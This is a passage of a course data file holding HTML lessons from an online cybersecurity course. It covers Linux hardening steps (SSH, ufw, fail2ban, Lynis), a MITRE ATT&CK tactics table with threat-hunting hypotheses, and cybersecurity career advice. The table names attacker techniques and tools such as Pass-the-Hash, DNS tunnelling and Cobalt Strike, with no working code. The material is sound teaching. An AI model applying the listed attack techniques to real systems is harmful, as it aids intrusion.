MaxAuthTries 3                   # Limit auth attempts
AllowUsers admin deploy          # Whitelist users

# 4. Firewall (ufw)
ufw enable
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp                  # SSH only from trusted IPs
ufw allow from 192.168.1.0/24 to any port 22

# 5. Fail2ban — auto-ban brute forcers
sudo apt install fail2ban
sudo systemctl enable fail2ban

# 6. Remove SUID from unnecessary binaries
chmod -s /usr/bin/at              # Remove SUID

# 7. Audit with Lynis
sudo apt install lynis
sudo lynis audit system</div>`},
  9:{title:'Threat Intelligence & Threat Hunting',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 59: Threat Intelligence & Threat Hunting</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 06 · Lesson 9/10</span></div><p>Threat intelligence is evidence-based knowledge about existing or emerging threats. Threat hunting is the proactive search for threats that have evaded automated detection.</p><h2>MITRE ATT&CK Framework</h2><p>The ATT&CK framework catalogues attacker TTPs (Tactics, Techniques, and Procedures) based on real-world observations. It is the industry standard for understanding and communicating about attacker behaviour.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Key ATT&CK Tactics (phases of an attack):
TA0001 Initial Access        → Phishing, exploit public-facing app
TA0002 Execution             → PowerShell, script interpreters
TA0003 Persistence           → Registry Run keys, cron jobs
TA0004 Privilege Escalation  → SUID exploits, token impersonation
TA0005 Defence Evasion       → Log clearing, encoding, rootkits
TA0006 Credential Access     → Password spraying, hashcat
TA0007 Discovery             → Network scanning, user enumeration
TA0008 Lateral Movement      → Pass-the-Hash, SSH, PsExec
TA0009 Collection            → Screenshot, keylogging, file staging
TA0010 Exfiltration          → DNS tunnelling, HTTPS to C2
TA0011 C2 (Command & Control)→ Meterpreter, Cobalt Strike beacons</div><h2>Threat Hunting Hypothesis Examples</h2><ul><li>"Are there any hosts making DNS requests to unusually long subdomains?" (DNS tunneling)</li><li>"Are there any users logging in after hours from foreign IPs?" (account compromise)</li><li>"Are there any processes spawning cmd.exe from unusual parents?" (living off the land)</li></ul>`},
  10:{title:'Building a Career in Cybersecurity',duration:'25 min',difficulty:'Beginner',html:`<h1>Lesson 60: Building a Career in Cybersecurity</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Beginner</span><span>📦 Module 06 · Lesson 10/10</span></div><h2>Certification Roadmap</h2><table><tr><th>Level</th><th>Certification</th><th>Focus</th></tr><tr><td>Entry</td><td>CompTIA Security+</td><td>Foundational security concepts</td></tr><tr><td>Entry</td><td>CEH (EC-Council)</td><td>Ethical hacking methodology</td></tr><tr><td>Mid</td><td>OSCP (OffSec)</td><td>Hands-on penetration testing — GOLD STANDARD</td></tr><tr><td>Mid</td><td>PNPT (TCM Security)</td><td>Practical network pentesting</td></tr><tr><td>Mid</td><td>CISM</td><td>Security management</td></tr><tr><td>Senior</td><td>CISSP</td><td>Security architecture and management</td></tr><tr><td>Senior</td><td>GREM/GPEN</td><td>GIAC specialisations</td></tr></table><h2>Practice Platforms</h2><ul><li><strong>TryHackMe:</strong> Beginner-friendly, guided learning paths</li><li><strong>HackTheBox:</strong> Realistic machines, competitive ranking</li><li><strong>VulnHub:</strong> Free downloadable vulnerable VMs</li><li><strong>DVWA:</strong> Damn Vulnerable Web Application for local practice</li><li><strong>PortSwigger Web Academy:</strong> World-class free web security labs</li></ul><h2>The African Cybersecurity Opportunity</h2><p>Africa has a massive and growing cybersecurity talent gap. As someone building skills in Cameroon and across the continent, you are not behind — you are early. The demand for skilled professionals who understand local infrastructure, local threat actors, and local compliance requirements is enormous and growing every year.</p><div class="highlight-box">🏆 <strong>COURSE COMPLETE! ALL 60 LESSONS FINISHED!</strong><br><br>You have completed Zero Trace Cyber Legacy — Cohort 1. You now have foundational knowledge across OSINT, Networking, Linux, Web Vulnerabilities, Exploitation, and Defence & Forensics. The journey continues — this is your launchpad, not your destination.<br><br><strong>Learn · Earn · Lead.</strong></div>`},
}};
